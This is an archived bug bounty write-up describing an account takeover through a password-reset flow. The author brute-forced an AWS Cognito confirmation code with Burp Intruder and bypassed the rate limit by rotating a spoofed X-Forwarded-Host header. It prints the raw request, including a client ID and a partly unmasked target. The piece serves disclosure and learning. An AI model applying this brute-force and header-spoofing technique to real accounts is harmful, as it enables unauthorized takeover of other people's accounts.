# Account Takeover with rate limit bypass

- **Source URL:** https://medium.com/@shamimahamed666070/account-takeover-with-rate-limit-bypass-f28c5089a1eb?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20251126144248/https://medium.com/@shamimahamed666070/account-takeover-with-rate-limit-bypass-f28c5089a1eb
- **Fetched:** 2026-11-24
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/2046 (id 2046)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Account Takeover with rate limit bypass

Hi guys, I’m Shamim Ahamed . It’s my first bug bounty write-up about my valid bug which could have allowed a malicious user to take over any account on that target site.

So let’s start

As I can’t disclose the name of the company, let’s call it “target.sultandine.com” .Last night i was testing on my target website ,and suddenly i notify something on [forgotpassword](https://my.tomorrowland.com/forgotpassword) to reset password option , so tried reset password and something in burp suite,the request like this

```
POST / HTTP/2
Host:target.sultandine.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: /
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://my.tomorrowland.com/
Content-Type: application/x-amz-json-1.1
X-Amz-Target: AWSCognitoIdentityProviderService.ConfirmForgotPassword
X-Amz-User-Agent: aws-amplify/5.0.4 js
Origin: https://my.tomorrowland.com
Content-Length: 128
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Te: trailers
{"ClientId":"1mf0i80fpuq6mqv5pmgpjb8veg","Username":"lasas28845@galcake.com","ConfirmationCode":"865732","Password":"shamim017"}
```
I tried to test on this and find a option ,there is a ConfirmationCode”:XXXX” which used to be change the password ,valid ConfirmationCode.

use burp suite intruder to brute force on ConfirmationCode.After sending request so many for brute force the code this it will blocking our request.

`{"__type":"LimitExceededException","message":"Attempt limit exceeded, please try after some time."}`
Then i tried to bypass this by using X-Forwared-Host: 127.0.0.1 on request .It’s successfully bypass limit.

use burp suite intruder to change multiple ip on X-Forwared-Host:127.0.0.$1$, and continue brute force on ConfirmationCode,after so many request the valid code change the password and successfully takeover the account .

That’s all…

Thank you for reading!
